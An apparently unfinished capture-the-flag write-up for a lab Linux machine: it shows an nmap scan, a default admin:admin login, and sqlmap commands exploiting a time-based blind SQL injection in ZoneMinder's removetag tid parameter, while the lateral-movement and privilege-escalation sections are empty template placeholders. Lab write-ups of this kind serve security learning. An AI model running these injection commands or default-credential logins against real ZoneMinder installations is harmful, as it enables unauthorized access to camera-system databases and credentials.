
# Box Name

## Box Info

- **Difficulty**: Easy
- **OS**: Linux
- **Date Completed**: 2026-03-11
- **IP Address**: 10.129.234.96

---

## Enumeration

### Nmap Scan

```bash
nmap -sC -sV -oA nmap/initial <IP>
```

**Results:**
- Port 22: OpenSSH 9.6p1
- Port 80: HTTP Apache httpd 2.4.58


### Web Enumeration
First thing I came across was a webpage that had a staff login button on the top right. Redirecting you to `http://cctv.htb/index=`. Here first thing to try was default credentials and `admin:admin` and we are in.

Here we land on a ZoneMinder CMS running version `v1.37.63` which has a known vulnerability to a time-based blind SQL injection payload. 
```bash
view=request&request=event&action=removetag&tid=1
```

---

## Exploitation — Initial Foothold

### The Plan

The plan here is to deploy the payload via `sqlmap` and hunt down the database credentials potentially leading to us either escalating privileges in the CMS or being able to get a SSH connection via one of the users directly. 

### Vulnerability

**Type**: Time-based blind SQL injection
**Location**: URL parameter
**Why it works**: This works because of the parameter `tid=1`. It was feeding directly into `TagID` with no sanitization. Then being passed to a `DELETE` query in the ZoneMinder's database. The reason it's `time-based blind` is because it never actually returns the data back to the page. So `sqlmap` can't actually read the characters directly, it had to deduce them, how?

For every character it basically says "`IF` character > 'M' `SLEEP` for 1 second". And it continues until it finds the correct character.

### Steps

1: Discover the names of the available databases.
```bash
sqlmap --cookie="ZMSESSID=<SESSION_COOKIE>" -u 'http://cctv.htb/zm/index.php?view=request&request=event&action=removetag&tid=1' --dbs --batch
```
**Result**: 
- `information_schema`
- `performance_schema`
- `zm`

2: Discover names of each table in the database.
```shell
sqlmap --cookie="ZMSESSID=<SESSION_COOKIE>" -u 'http://cctv.htb/zm/index.php?view=request&request=event&action=removetag&tid=1' -D zm --tables --batch
```
**Result**: Key tables we found. `Users`.


3:
```shell

```

---

## Lateral Movement

<!-- If you needed to pivot between users before privesc -->

### From `user_a` to `user_b`

**Method**: <!-- Credential reuse, hash cracking, readable files, etc. -->

```bash
# Commands
```

**User flag**: `/home/<user>/user.txt`

---

## Privilege Escalation

### Enumeration

```bash
sudo -l
# Always run this first
```

<!-- What did you find? SUID binaries, writable crons, sudo entries, capabilities? -->

### Vulnerability

**Type**: <!-- e.g. Sudo misconfiguration, CVE, SUID binary, writable cron -->
**Why it works**: <!-- Technical explanation -->

### Exploit

```bash
# Commands
```

**Root flag**: `/root/root.txt`

---

## Rabbit Holes

<!-- What did you waste time on? What looked promising but wasn't? -->
<!-- This is where the real learning is. Don't skip it. -->

-

---

## Attack Chain Summary

```
Initial access vector
      ↓
How you got a shell
      ↓
Lateral movement (if any)
      ↓
Privesc method
      ↓
Root
```

---

## Key Learnings

<!-- What would you do differently? What new technique did you learn? -->
<!-- What will you remember for the next box? -->

-

---

## Commands Reference

```bash
# Enumeration


# Exploitation


# Privilege Escalation


# Flags
cat /home/<user>/user.txt
cat /root/root.txt
```

---

## Tags

#htb #easy #linux
